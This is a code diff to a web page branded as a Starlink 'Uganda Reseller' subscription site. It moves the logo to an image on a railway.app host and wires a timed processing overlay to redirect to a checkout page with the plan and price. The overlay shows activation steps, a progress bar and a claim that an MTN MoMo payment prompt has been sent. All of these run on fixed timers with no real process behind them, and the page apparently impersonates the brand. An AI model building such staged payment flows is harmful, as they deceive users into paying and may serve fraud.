@@ -90,9 +90,13 @@
         }
 
         .brand { display: flex; align-items: center; gap: 10px; }
-        .brand-logo { display: flex; align-items: center; gap: 8px; }
-        .brand-logo svg { width: 34px; height: 34px; }
-        .brand-name { font-size: 20px; font-weight: 800; letter-spacing: 4px; color: var(--white); }
+
+        .brand-logo-img {
+            height: 54px;
+            width: auto;
+            display: block;
+        }
+
         .brand-divider { width: 1px; height: 26px; background: rgba(255,255,255,0.2); margin: 0 4px; }
         .brand-sub { font-size: 12px; color: var(--gray-400); font-weight: 500; letter-spacing: 0.5px; }
 
@@ -392,7 +396,6 @@
             to   { opacity: 1; }
         }
 
-        /* Rotating satellite glow background */
         .processing-overlay::before {
             content: "";
             position: absolute;
@@ -417,7 +420,6 @@
             z-index: 2;
         }
 
-        /* Animated satellite dish / orbit spinner */
         .orbit-wrap {
             width: 130px;
             height: 130px;
@@ -508,7 +510,6 @@
 
         .processing-sub strong { color: var(--white); font-weight: 800; }
 
-        /* Mini progress bar */
         .processing-bar {
             width: 200px;
             height: 5px;
@@ -650,15 +651,7 @@
     <header class="header">
         <div class="header-inner">
             <a href="/" class="brand">
-                <div class="brand-logo">
-                    <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg" aria-label="Starlink">
-                        <circle cx="32" cy="32" r="30" stroke="#ffffff" stroke-width="3" fill="none"/>
-                        <path d="M8 32c0-4 3-7 7-7h34c4 0 7 3 7 7s-3 7-7 7H15c-4 0-7-3-7-7z" fill="#ffffff"/>
-                        <circle cx="32" cy="32" r="6" fill="#000000"/>
-                        <circle cx="32" cy="32" r="3" fill="#2563eb"/>
-                    </svg>
-                    <span class="brand-name">STARLINK</span>
-                </div>
+                <img src="https://ug-starlinknetwork.up.railway.app/static/images/starlink_logo_new.png" alt="STARLINK" class="brand-logo-img">
                 <div class="brand-divider"></div>
                 <span class="brand-sub">Uganda Reseller</span>
             </a>
@@ -796,7 +789,6 @@
     <div class="processing-overlay" id="processing-overlay">
         <div class="processing-content">
 
-            <!-- Animated orbit -->
             <div class="orbit-wrap">
                 <div class="orbit-ring"><span class="orbit-dot"></span></div>
                 <div class="orbit-ring inner"></div>
@@ -869,11 +861,9 @@
 
             currentPlan = plan;
 
-            // Visual tap feedback
             document.querySelectorAll('.plan-card').forEach(c => c.classList.remove('tapped'));
             card.classList.add('tapped');
 
-            // Show processing overlay
             showProcessing(plan);
         }
 
@@ -884,26 +874,21 @@
             const bar = document.getElementById('processing-bar-fill');
             const percentText = document.getElementById('processing-percent');
 
-            // Update labels
             planLabel.innerHTML = 'Activating <strong>' + plan.name + ' (' + plan.data + ')</strong>';
             message.innerHTML = 'Please approve the <strong>MTN MoMo</strong> prompt on your phone to complete your subscription for <strong>' + plan.name + '</strong>.';
 
-            // Reset steps
             ['step-1', 'step-2', 'step-3'].forEach((id, i) => {
                 const el = document.getElementById(id);
                 el.classList.remove('active', 'done');
                 if (i === 0) el.classList.add('active');
             });
 
-            // Reset progress
             bar.style.width = '0%';
             percentText.textContent = '0%';
 
-            // Show overlay
             overlay.classList.add('open');
             document.body.style.overflow = 'hidden';
 
-            // Progress bar animation
             let progress = 0;
             clearInterval(progressInterval);
             progressInterval = setInterval(() => {
@@ -916,7 +901,6 @@
                 percentText.textContent = Math.floor(progress) + '%';
             }, 180);
 
-            // Step transitions
             setTimeout(() => {
                 document.getElementById('step-1').classList.remove('active');
                 document.getElementById('step-1').classList.add('done');
@@ -930,15 +914,18 @@
             }, 4500);
 
             // ============================================
-            // REDIRECT — change this URL when you show me the next page
+            // REDIRECT to checkout page with plan details
             // ============================================
             setTimeout(() => {
                 document.getElementById('step-3').classList.remove('active');
                 document.getElementById('step-3').classList.add('done');
 
-                // TODO: Replace with the actual next page URL
-                // window.location.href = '/checkout/?plan=' + encodeURIComponent(currentPlan.name);
-                console.log('Redirecting to next page with plan:', currentPlan);
+                const params = new URLSearchParams({
+                    plan: currentPlan.name,
+                    data: currentPlan.data,
+                    price: currentPlan.price
+                });
+                window.location.href = '/checkout/?' + params.toString();
             }, 6500);
         }
     </script>
